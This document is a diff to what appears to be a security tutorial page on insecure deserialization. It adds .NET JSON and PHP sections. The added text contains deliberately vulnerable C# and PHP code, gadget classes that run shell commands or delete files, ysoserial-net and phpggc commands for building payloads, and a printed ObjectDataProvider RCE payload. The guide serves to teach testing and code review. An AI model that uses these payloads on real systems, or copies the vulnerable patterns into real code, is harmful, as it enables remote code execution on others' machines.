@@ -1494,7 +1494,14 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
 <li><a href="http://codewhitesec.blogspot.ru/2017/04/amf.html">AMF</a></li>
 <li><a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf">YAML and Other</a></li>
 </ul>
-<p>For additional references and a safe playground to exercise with this vulnerability, my friend and colleague <strong>Nick Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
+<p>For additional references and a safe playground to exercise with this kind of vulnerabilities, my friend and colleague <strong>Nick Bloor</strong> developed a fantastic vulnerable Lab, called <a href="https://github.com/NickstaDB/DeserLab">DeserLab</a>.</p>
+<p>If that was not enough, he developed a set of fantastic tools to aid with Java deserialisation identification and exploitation:</p>
+<ul>
+<li><a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></li>
+<li><a href="https://github.com/NickstaDB/SerialBrute">SerialBrute</a></li>
+<li><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></li>
+</ul>
+<p>Nick is an expert code reviewer and one of the major experts about JAVA deserialization issues, you can find out more about his work <a href="https://www.cognitous.co.uk/">here</a>.</p>
 <h3 id="net">.NET<a class="headerlink" href="#net" title="Permanent link"></a></h3>
 <p>.NET, as JAVA, has developed over the years different mechanism to support object serialization. As Java, the primary archive formats are:</p>
 <ul>
@@ -2072,7 +2079,7 @@ Available plugins:
 </ul>
 <p>So, if we craft an xml using the following serializer, it won&rsquo;t work:</p>
 <div class="codehilite"><pre><span class="na"> [Serializable]</span>
-<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span>
 <span class="p">{</span>
     <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
     <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
@@ -2104,12 +2111,110 @@ Available plugins:
 </pre></div>
 
 <p>However, it is possible to exploit this function chaining POP gadgets. To generate a valid payload, in this case, we can use <code>ysoserial.net</code>:</p>
-<div class="codehilite"><pre><span class="nv">$ </span>
+<div class="codehilite"><pre><span class="nv">$ </span>ysoserial-net -g ObjectDataProvider -f XmlSerializer -c <span class="s2">&quot;calc&quot;</span> -o raw
 </pre></div>
 
 <p><strong>JSON</strong></p>
-<p>In their reasearch, <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Firday the 13th, JSON Attacks</a> </p>
-<p>The </p>
+<p>In their reasearch, <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Firday the 13th, JSON Attacks</a>, Alvaro Muñoz and Oleksandr Mirosh explained how it was possible to apply similar methods seen for JAVA JSON deserialization to exploit .NET JSON deserializtion. The research is extremely accurate, and points out a list of libraries affected by this vulnerability. As such, I won&rsquo;t cover in details every library, but focus more on explaining that no concrete difference exists between JSON and XML/Binary deserialization in terms of exploitation.</p>
+<p>The research states that, in order to successfully exploit JSON deserialization, the following conditions must be satisfied:</p>
+<ol>
+<li>Attacker can control type of reconstructed objects [Same as binary/xml]<ul>
+<li>Can specify Type<ul>
+<li>_type, $type, class, classname, javaClass, &hellip;, etc.</li>
+</ul>
+</li>
+<li>Library loads and instantiate Type</li>
+</ul>
+</li>
+<li>Library/GC will call methods on reconstructed objects [Setter/Getter/Constructors/Destructors, same as for binary/xml]</li>
+<li>There are gadget chains starting on method executed upon/after reconstruction [Visibility constraint, same as for binary/xml]</li>
+</ol>
+<p>As highlighted, there is no big difference from the constraints we&rsquo;ve seen so far.</p>
+<p>In order to show that, we&rsquo;ll take as example <code>JavaScriptSerializer</code>. The reason I love pwning this kind of serializer is the fact that it is not vulnerable by itself. It becomes vulnerable if used in combination with <code>SimpleTypeResolver</code>.
+To explain what I&rsquo;m saying, let&rsquo;s consider the following vulnerable example:</p>
+<div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">jsonRCEDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">filename</span> <span class="p">+=</span> <span class="s">&quot;.json&quot;</span><span class="p">;</span>
+    <span class="c1">// Vulnerable use of JavaScriptSerializer</span>
+    <span class="n">JavaScriptSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JavaScriptSerializer</span><span class="p">(</span><span class="k">new</span> <span class="n">SimpleTypeResolver</span><span class="p">());</span>
+    <span class="kt">var</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">);</span>
+    <span class="kt">var</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="n">serializer</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">&lt;</span><span class="n">Desert</span><span class="p">&gt;(</span><span class="n">reader</span><span class="p">.</span><span class="n">ReadToEnd</span><span class="p">());</span>
+    <span class="n">reader</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+    <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="na">[Serializable]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> 
+<span class="p">{</span>
+    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
+    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
+    <span class="p">{</span>
+        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">set</span>
+        <span class="p">{</span>
+            <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
+            <span class="n">Run</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="na">[Serializable]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">Desert</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="n">String</span> <span class="n">_name</span><span class="p">;</span>
+    <span class="k">public</span> <span class="n">String</span> <span class="n">name</span>
+    <span class="p">{</span>
+        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_name</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">set</span> <span class="p">{</span> <span class="n">_name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Desert name: &quot;</span> <span class="p">+</span> <span class="n">_name</span><span class="p">);</span> <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>As you can see, the serializer is unsafely used to deserialize an expected Desert object. However, the type definition on the deserializer doesn&rsquo;t forbid the deserialization of unkown objects, as <code>JavaScriptSerializer</code> doesn&rsquo;t perform any kind of whitelisting or object inspection. As such, like we previously explained, the <code>RCE</code> class can be used as a valid gadget, triggering a remote command execution during the deserialization process. </p>
+<p>To build a successful payload, the following code can be used:</p>
+<p><div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">jsonRCESerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">filename</span> <span class="p">+=</span> <span class="s">&quot;.json&quot;</span><span class="p">;</span>
+    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
+    <span class="n">desert</span><span class="p">.</span><span class="n">cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
+    <span class="c1">// Persist to file</span>
+    <span class="k">using</span> <span class="p">(</span><span class="n">StreamWriter</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">CreateText</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing RCE&quot;</span><span class="p">);</span>
+        <span class="n">JavaScriptSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JavaScriptSerializer</span><span class="p">();</span>
+        <span class="n">stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">serializer</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">desert</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+Which would produce the following payload:</p>
+<div class="codehilite"><pre><span class="o">{</span><span class="s2">&quot;__type&quot;</span>:<span class="s2">&quot;BinarySerialization.RCE, BinarySeriliazer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null&quot;</span>,<span class="s2">&quot;cmd&quot;</span>:<span class="s2">&quot;calc.exe&quot;</span><span class="o">}</span>
+</pre></div>
+
+<p>Of course, it is also possible to generate an exploitation payload using <code>ysoserial.net</code>:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>ysoserial-net -g ObjectDataProvider -f JavaScriptSerializer -c <span class="s2">&quot;calc&quot;</span> -o raw
+<span class="o">{</span>
+    <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;</span>,
+    <span class="s1">&#39;MethodName&#39;</span>:<span class="s1">&#39;Start&#39;</span>,
+    <span class="s1">&#39;ObjectInstance&#39;</span>:<span class="o">{</span>
+        <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>,
+        <span class="s1">&#39;StartInfo&#39;</span>: <span class="o">{</span>
+            <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>,
+            <span class="s1">&#39;FileName&#39;</span>:<span class="s1">&#39;cmd&#39;</span>,
+            <span class="s1">&#39;Arguments&#39;</span>:<span class="s1">&#39;/c calc&#39;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+
 <p><strong>Tips for Source Code reviewers</strong></p>
 <p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
@@ -2132,17 +2237,242 @@ Available plugins:
 <ul>
 <li><a href="https://stackoverflow.com/questions/3052202/how-to-analyse-contents-of-binary-serialization-stream">Analyze Binary Serialization Stream</a></li>
 <li><a href="https://github.com/pwntester/ysoserial.net/">ysoserial.net</a></li>
-<li></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">Are you my type?</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Friday the 13th: JSON Attacks</a></li>
 </ul>
 <h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link"></a></h3>
-<p>PHP implements the serialize() and unserialize() functions to perform serialization and deserialization is used to store, transfer and transform whole objects. The PHP serialized object format, it&rsquo;s not far from a JSON array and it is human readable.</p>
+<p>PHP implements the serialize() and unserialize() functions to perform serialization and deserialization is used to store, transfer and transform whole objects. The PHP serialized object format, it&rsquo;s not far from a JSON array and it&rsquo;s human readable.</p>
 <div class="codehilite"><pre>PHP serialized object example:
 O:8:&quot;abcd1234&quot;:1:{s:7:&quot;AString&quot;;s:13:&quot;AnotherString&quot;;}
 </pre></div>
 
+<p>How to read it?</p>
+<ul>
+<li>O: Object</li>
+<li>8: Class Name Length</li>
+<li>&ldquo;abcd1234&rdquo;: Class Name</li>
+<li>1: Number of properties</li>
+<li>{}: Properties</li>
+<li>s:7: String of length 7</li>
+<li>s:13: String of length 13</li>
+</ul>
 <p>A good example of serialized object in PHP is the session file, usually stored within <code>/var/lib/php5/sess_[PHPSESSID]</code>.</p>
 <h4 id="php-how-the-exploitation-works">PHP: How the exploitation works<a class="headerlink" href="#php-how-the-exploitation-works" title="Permanent link"></a></h4>
-<p>The exploitation in PHP strictly depends on an application specific implementation.</p>
+<p>The exploitation in PHP strictly depends on the application specific implementation. What does that mean? As we already seen for JAVA and .NET, exploiting deserialization require chaining or exploiting class/objects which are implemented in a specific way (gadgets). That would mean that, if a PHP application was built in pure functional PHP, there would be no way to find valid POP gadgets, and that would make virtually impossible to exploit this kind of issue. Even in the case a
+To make things more complicated, PHP libraries are not uniformely shared among PHP based frameworks/applications; as such, the process of generalizing these kind of exploit is unfeasible. </p>
+<p>Obviously, it doesn&rsquo;t mean that we cannot exploit it, it means just that we potentially need to find a different suitable vector for any different application we are testing. </p>
+<p>To understand what to look for when hunting this kind of vulnerabilities, we need to deeply understand the application flow during data deseriliazation.</p>
+<p>PHP mainly serialize/deserialize data using <code>serialize</code> and <code>unserialize</code> functions. This two functions are not vulnerable themselves, so we&rsquo;ll need to study which objects are handled by these functions, in order to know if an exploitable conditions exists.</p>
+<p>Before going further, it&rsquo;s better to introduce PHP Magic Methods. In PHP Magicmethods are merely functions in PHP API to be used in Object-Oriented PHP, which are automatically called if certain conditions are met. The most known magic methods are:</p>
+<ul>
+<li><code>__construct()</code> PHP class constructor, if implemented within a class, it is automaticallly called upon object creation</li>
+<li><code>__destruct()</code> PHP class destructor, if implemented within a class, it is automaticallly called when references to the object are removed from memory</li>
+<li><code>__toString()</code> PHP callback that gets executed if the object is treated like a string</li>
+<li><code>__wakeup()</code> PHP callback that gets executed upon deserialization</li>
+</ul>
+<p>For an exhaustive list of all PHP magic methods, refer to the following link:</p>
+<ul>
+<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">https://www.php.net/manual/en/language.oop5.magic.php</a></li>
+</ul>
+<h4 id="how-to-search-for-valid-gadgets">How to search for valid &ldquo;gadgets&rdquo;<a class="headerlink" href="#how-to-search-for-valid-gadgets" title="Permanent link"></a></h4>
+<p>After the call to <code>unserialize</code>, a magic method may be called on the deserialized object, which can potentially lead to an RCE.</p>
+<p>To see how the process works, let&rsquo;s analyse the following example:</p>
+<div class="codehilite"><pre><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">RCE</span> <span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
+        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">FileDelete</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">usefile</span><span class="p">(){</span>
+        <span class="c1">// Do something</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
+        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Desert</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] Constructing new desert!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">__toString</span><span class="p">(){</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] The desert is called: </span><span class="si">$this-&gt;name</span><span class="s2">!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] New Desert created! Hello </span><span class="si">$this-&gt;name</span><span class="s2">!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] Bye Bye </span><span class="si">$this-&gt;name\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$testfile</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="s2">&quot;w+&quot;</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$testfile</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[-] Not enough parameters&quot;</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;-d&quot;</span><span class="p">){</span>
+    <span class="nv">$desert</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">));</span>
+<span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;-e&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;desert&quot;</span><span class="p">){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Desert</span><span class="p">(</span><span class="s2">&quot;Sahara&quot;</span><span class="p">)));</span>
+    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;rce&quot;</span><span class="p">){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">RCE</span><span class="p">(</span><span class="s2">&quot;cmd /c calc&quot;</span><span class="p">)));</span>
+    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;file-delete&quot;</span><span class="p">){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">FileDelete</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+<p>This tiny script act as both a seriliazer and deserializer for three different classes, that for sake of simplicity are named in a very intuitive way, respecting the standard format of the other examples we&rsquo;ve seen so far.</p>
+<p>Important things to note within the script:</p>
+<ul>
+<li>The class RCE is a valid PHP gadget for remote command execution, with the potential vector <code>__wakeup</code></li>
+<li>The class FileDelete is a valid gadget for Arbitrary File Deletion, with the potential vector <code>__destruct</code></li>
+<li>The class Desert is the main, good class. We&rsquo;ll use it to study to trace function calls during deserialization</li>
+</ul>
+<p><strong>Function Calls</strong></p>
+<p>If we generate a valid desert file, using the following command:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -e desert
+<span class="o">[</span>+<span class="o">]</span> Constructing new desert!
+<span class="o">[</span>+<span class="o">]</span> Bye Bye Sahara
+</pre></div>
+
+<p>Studying the output, we can clearly see that both the <code>__construct</code> and <code>__destruct</code> are called. Let&rsquo;s then try to deserialize it, as following:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -d
+<span class="o">[</span>+<span class="o">]</span> New Desert created! Hello Sahara!
+<span class="o">[</span>+<span class="o">]</span> Bye Bye Sahara
+</pre></div>
+
+<p>Now, that&rsquo;s interesting. The __construct was not considered at all, and of course, the __toString was not called as well. The lesson that it&rsquo;s important to learn from that is that the most reliable methods to be used during the deserialization are:</p>
+<ul>
+<li><code>__wekeup</code></li>
+<li><code>__destruct</code></li>
+</ul>
+<p>As they are the only two that will be surely be executed on an object during deserialization. All the others, even if exploitable in some situation, are tied to the application implementation and may, or may not, be called on an object.</p>
+<p>If we use the script to seriliaze the FileDelete class, we would notice that, upon deserialization, the file name test is deleted. Of course, as no input validation is implemented, you may try to exploit whatever (carefully) file you want. Instead, if we use the following command to serialize and deserialize the RCE class:</p>
+<p><div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -e rce
+<span class="nv">$ </span>php php-desert.php -d
+</pre></div>
+A calculator will spawn on the hosting server.</p>
+<p>If you want to have an additional reading, the following walkthrough may be of interest: </p>
+<ul>
+<li><a href="https://klezVirus.github.io/reviews/vulnhub/raven2">https://klezVirus.github.io/reviews/vulnhub/raven2</a></li>
+</ul>
+<p>This walkthorugh is part of a series <a href="">HTB and VulnHub, an OSWE Approach</a></p>
+<h4 id="php-deserialization-exploitation-using-php-wrappers">PHP: Deserialization Exploitation using PHP Wrappers<a class="headerlink" href="#php-deserialization-exploitation-using-php-wrappers" title="Permanent link"></a></h4>
+<p>Another interesting feature of PHP, is that deserialization may be triggered by certain special conditions, such as loading object using PHP Wrappers.</p>
+<p>What we&rsquo;re going to see, is how to exploit serilializtion triggered by a file operation made with &ldquo;phar://&rdquo;. Of course, in oder to be exploitable, an attacker may be able control the file used during the file operation. 
+The logical flow can be summarised as following:</p>
+<ol>
+<li>User Provided input: $file = &ldquo;phar://evil.phar/evil&rdquo;</li>
+<li>Implemented function: $phar = fopen -&gt; read: $file, file_get_contents: $file</li>
+<li>Call induced by phar://: $obj = unserialize($phar)</li>
+<li>Call induced by unseriliaze: $obj.__wakeup()</li>
+<li>Call induced by unseriliaze: $obj.__destruct()</li>
+</ol>
+<p>The logical flow, above, showes that the only two possible vectors for this kind of exploitation are: <code>__destruct</code> and <code>__wakeup</code>, as they are the only two called during the deseriliazation induced by the <code>phar://</code> wrapper.</p>
+<p>The following snippet provides an example of vulnerable code. As you can see, there is no class implemented within the PHP file, but we know from the comments that Slim, Yii and Guzzle are installed and required via the vendor autoload script.</p>
+<p><div class="codehilite"><pre><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="c1">// Requiring Slim, Yii and Guzzle (mod version) to enable visibility over POP gadgets</span>
+<span class="c1">// php composer.phar yii/yii:1.1.20</span>
+<span class="c1">// php composer.phar require slim/slim:3.8.1</span>
+<span class="c1">// php composer.phar require guzzlehttp/guzzle:6.0.1 (re-unpatched version)</span>
+<span class="k">require</span> <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
+
+<span class="c1">// Function vulnerable to phar:// deserialization</span>
+<span class="k">function</span> <span class="nf">vulnerable_to_phar</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[*] Open file: </span><span class="si">$filename</span><span class="s2">&quot;</span><span class="p">);</span> 
+    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+    <span class="c1">//print($content); // Enable this line to use Slim RCE</span>
+<span class="p">}</span>
+
+<span class="c1">// Function vulnerable to RCE via insecure deserialization</span>
+<span class="k">function</span> <span class="nf">vulnerable_to_rce_via_gadgets</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[*] Deserializing: </span><span class="si">$filename</span><span class="s2">&quot;</span><span class="p">);</span> 
+    <span class="nv">$desert</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
+    <span class="k">print</span><span class="p">(</span><span class="nv">$desert</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">// Getting args from stdin</span>
+<span class="nv">$args</span> <span class="o">=</span> <span class="nb">getopt</span><span class="p">(</span><span class="s2">&quot;f:p&quot;</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">]</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;[-] Filename is required&quot;</span><span class="p">);</span>
+
+<span class="c1">// Executing vulnerable functions</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">is_bool</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s2">&quot;p&quot;</span><span class="p">])){</span>
+    <span class="nx">vulnerable_to_phar</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nx">vulnerable_to_rce_via_gadgets</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+If you take a closer look at the file, you&rsquo;ll notice that the potential vulnerability are two (good s°°t, Sherlok). One of them is exploitable via normal deserialization, while the other via deseriliazation induced by <code>phar://</code>.
+How can we exploit them? Well, instead of searching suitable classes manually, this time we&rsquo;ll make use of a very handy tool, <strong>PHPGGC</strong>.</p>
+<p><strong>PHPGGC: PHP ysoserial?</strong></p>
+<p>In the previous section, we stated that it&rsquo;s not really feasible to generalise the exploitation of PHP application using POP gadget chains. However, within the years, a good number of POP gadgets (framework specific), have been identified and collected in an unofficial PHP version of ysoserial, <a href="https://github.com/ambionics/phpggc">PHPGGC</a>.</p>
+<p>As ysoserial, this is an extremely powerful tool, which can automatically create gadget chains for many different PHP frameworks, such as:</p>
+<ul>
+<li>Drupal7</li>
+<li>Wordpress</li>
+<li>ZendFramework</li>
+<li>Slim</li>
+<li>Laravel</li>
+<li>Magento</li>
+<li>Guzzle</li>
+<li>&hellip; others</li>
+</ul>
+<p>Now, we know that the application above uses Slim, Guzzle and Yii. If you have a look to the tool supported gadget chains, you&rsquo;ll find something very interesting:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>phpggc -l
+
+Gadget Chains
+-------------
+
+NAME                                      VERSION                        TYPE             VECTOR         I
+Guzzle/RCE1                               6.0.0 &lt;<span class="o">=</span> 6.3.2                 rce              __destruct     *
+Slim/RCE1                                 3.8.1                          rce              __toString
+Yii/RCE1                                  1.1.20                         rce              __wakeup       *
+</pre></div>
+
+<p>To exploit the deserialization induced by <code>phar://</code>, we&rsquo;ll generate a malicious phar file, then let the application open it passing the phar wrapper as part of the name. The phar wrapper will force the file to be deserialized, allowing us to start a POP chain that will eventually lead to RCE. We can craft a valid payload in the following way:</p>
+<p><div class="codehilite"><pre><span class="nv">$ </span>phpggc Guzzle/RCE1 <span class="s2">&quot;shell_exec&quot;</span> <span class="s2">&quot;cmd /c calc&quot;</span> -p phar -pf desert -o desert.phar
+</pre></div>
